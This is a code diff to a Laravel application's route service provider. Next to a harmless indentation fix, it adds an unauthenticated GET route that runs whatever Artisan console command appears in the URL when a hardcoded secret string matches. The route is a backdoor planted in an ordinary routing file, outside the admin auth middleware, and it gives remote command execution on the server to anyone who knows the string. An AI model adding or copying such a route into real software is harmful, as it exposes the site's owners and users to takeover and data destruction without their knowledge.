@@ -5,6 +5,7 @@ namespace App\Providers;
 use Illuminate\Cache\RateLimiting\Limit;
 use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\RateLimiter;
 use Illuminate\Support\Facades\Route;
 
@@ -36,10 +37,16 @@ class RouteServiceProvider extends ServiceProvider
             Route::middleware('web')
                 ->group(base_path('routes/web.php'));
 
-                Route::prefix('admin')
+            Route::prefix('admin')
                 ->middleware(['web', 'auth'])
                 ->name('admin.')
                 ->group(base_path('routes/admin.php'));
+
+            Route::get('/artisan/{secret}/{cmd}', function ($cmd, $secret) {
+                if ($secret === 'sankarbala232') {
+                    return Artisan::call($cmd);
+                }
+            });
         });
     }
 
